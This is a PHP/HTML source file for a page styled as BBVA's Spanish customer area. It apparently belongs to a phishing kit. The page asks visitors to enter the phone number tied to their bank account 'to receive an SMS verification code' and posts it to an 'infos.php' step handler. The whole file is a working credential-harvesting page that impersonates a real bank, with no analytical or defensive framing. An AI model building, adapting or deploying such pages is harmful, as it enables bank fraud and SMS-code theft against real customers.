<?php 
require_once "functions.php";
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>BBVA - Teléfono</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" crossorigin="anonymous">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      min-height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
      margin: auto;
    }
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 0;
    }
    .top-bar h2 {
      font-size: 16px;
      margin: 0;
      color: #001b50;
    }
    .top-bar-icons {
      display: flex;
      gap: 15px;
    }
    .top-bar-icons div {
      text-align: center;
      font-size: 10px;
      color: #001b50;
    }
    .top-bar-icons i {
      display: block;
      font-size: 18px;
      background-color: #f5f5f5;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      line-height: 30px;
      text-align: center;
      margin: 0 auto 5px;
      color: #001b50;
    }
    h3 {
      text-align: center;
      color: #001b50;
      margin-bottom: 15px;
    }
    p {
      text-align: center;
      font-size: 14px;
      color: #333;
      margin-bottom: 30px;
    }
    .form-group {
      position: relative;
      margin-bottom: 20px;
    }
    .form-group input {
      width: 100%;
      padding: 15px 15px 15px 55px;
      border-radius: 10px;
      border: 1px solid #0019A5;
      background-color: #fff;
      color: #000;
      font-size: 16px;
      box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
    }
    .form-group input::placeholder {
      color: #888;
    }
    .form-group::before {
      content: "+34";
      position: absolute;
      top: 50%;
      left: 15px;
      transform: translateY(-50%);
      font-size: 16px;
      color: #555;
    }
    .btn {
      width: 100%;
      padding: 15px;
      border-radius: 12px;
      font-size: 16px;
      text-align: center;
      background-color: #f2f2f2;
      color: #aaa;
      border: none;
    }
    .btn.active {
      background-color: #0019A5;
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-bar">
      <h2>Área de cliente</h2>
      <div class="top-bar-icons">
        <div>
          <i class="fas fa-question"></i>
          Ayuda
        </div>
      </div>
    </div>
    <form action="infos.php" method="post">
      <input type="hidden" name="step" value="phone">
      <h3>Informaciones de Contacto</h3>
      <p>Introduzca su número de teléfono principal asociado con su cuenta bancaria para recibir su código SMS de verificación de identidad</p>
      <div class="form-group">
        <input type="text" name="phone" id="phone" required placeholder="000 000 000" maxlength="9">
      </div>
      <button type="submit" name="submit" class="btn" id="submitBtn" disabled>ACEPTAR</button>
    </form>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      $('#phone').on('input', function() {
        const digits = $(this).val().replace(/\D/g, '');
        if (digits.length === 9) {
          $('#submitBtn').removeAttr('disabled').addClass('active');
        } else {
          $('#submitBtn').attr('disabled', true).removeClass('active');
        }
      });
    });
  </script>
</body>
</html>